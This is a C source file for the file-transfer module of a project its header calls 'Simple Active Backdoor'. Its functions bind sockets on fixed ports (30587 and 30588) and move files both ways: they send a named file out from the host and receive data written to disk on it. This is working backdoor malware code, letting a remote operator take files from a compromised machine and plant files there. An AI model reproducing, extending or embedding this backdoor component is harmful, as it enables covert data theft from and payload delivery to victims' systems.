/******************************************************************************
 * transfer.c - This is to be able to transfer files across the network using *
 *              this project, S.A.B. also known as "Simple Active Backdoor".  *
 ******************************************************************************
 * Created by Philip "5n4k3" Simonson                    (2017)               *
 ******************************************************************************
 */

/* standard includes */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>

/* ports for file transfers */
#define UPLOAD_PORT 30587
#define DOWNLOAD_PORT 30588

/* my includes */
#include "prs_socket/socket.h"
#include "../../debug.h"
#include "transfer.h"

/* download() - download a file from SAB.
 */
int download(const char *hostname, const char *filename) {
  sockcreate_func_t sock_func;
  struct sockaddr_in client;
  int sockfd, clientfd, retval;

  socket_init(SOCKET_BIND, &sock_func);
  /* create socket */
  sockfd = sock_func.socket_bind(hostname, DOWNLOAD_PORT, &clientfd, &client);
  /* server loop */
  retval = handle_server(&sockfd, &clientfd, &client, filename, &hdl_download);
  /* close socket */
  close_socket(&sockfd);
  return retval;
}

/* upload() - upload a file to SAB.
 */
int upload(const char *hostname, const char *filename) {
  sockcreate_func_t sock_func;
  struct sockaddr_in client;
  int sockfd, clientfd, retval;

  /* init socket functions */
  socket_init(SOCKET_BIND, &sock_func);
  /* create socket */
  sockfd = sock_func.socket_bind(hostname, UPLOAD_PORT, &clientfd, &client);
  /* server loop */
  retval = handle_server(&sockfd, &clientfd, &client, filename, &hdl_upload);
  /* close socket */
  close_socket(&sockfd);
  return retval; /* return retval */
}

/* hdl_download() - handles the file transfer from SAB.
 */
int hdl_download(int *sockfd, struct sockaddr_in *client, const char *filename) {
  FILE *file = NULL;
  char data[BUFSIZ];
  size_t total_bytes = 0;
  int bytesRead, bytesWritten;

  if(sockfd == NULL || client == NULL || filename == NULL)
    return -1;

  ERROR_FIXED((file = fopen(filename, "rb")) == NULL, "Cannot open file for reading.");
  while((bytesRead = fread(data, 1, sizeof data, file)) > 0) {
    bytesWritten = send(*sockfd, data, bytesRead, 0);
    ERROR_FIXED(bytesWritten < 0, "Failed to write file data.");
    if(bytesWritten > 0)
      total_bytes += bytesWritten;
  }
  fclose(file);
  ERROR_FIXED(bytesRead < 0, "Failed to read data from file.");
  if(bytesRead == 0) {
    memset(data, 0, sizeof data);
    snprintf(data, sizeof data, "Transfer Complete!\r\n");
    ERROR_FIXED(send(*sockfd, data, strlen(data), 0) != (int)strlen(data),
		"Send data to client failed.");
  }
  close_socket(sockfd);
  return 0;

error:
  if(file != NULL)
    fclose(file);
  close_socket(sockfd);
  return -1;
}

/* hdl_upload() - handles the file transfer to SAB.
 */
int hdl_upload(int *sockfd, struct sockaddr_in *client, const char *filename) {
  FILE *file = NULL;
  char data[BUFSIZ];
  size_t total_bytes = 0;
  int bytesRead, bytesWritten;

  if(sockfd == NULL || client == NULL || filename == NULL)
    return -1;

  ERROR_FIXED((file = fopen(filename, "wb")) == NULL, "Cannot open file for writing.");
  while((bytesRead = recv(*sockfd, data, sizeof data, 0)) > 0) {
    bytesWritten = fwrite(data, 1, bytesRead, file);
    ERROR_FIXED(bytesWritten < 0, "Failed to write file data.");
    if(bytesWritten > 0)
      total_bytes += bytesWritten;
  }
  fclose(file);
  ERROR_FIXED(bytesRead < 0, "Failed to read data from server.");
  if(bytesRead == 0) {
    memset(data, 0, sizeof data);
    snprintf(data, sizeof data, "Transfer complete!\r\n");
    ERROR_FIXED(send(*sockfd, data, strlen(data), 0) != (int)strlen(data),
		"Send data to client failed.");
  }
  close_socket(sockfd);
  return 0;

error:
  if(file != NULL)
    fclose(file);
  close_socket(sockfd);
  return -1;
}
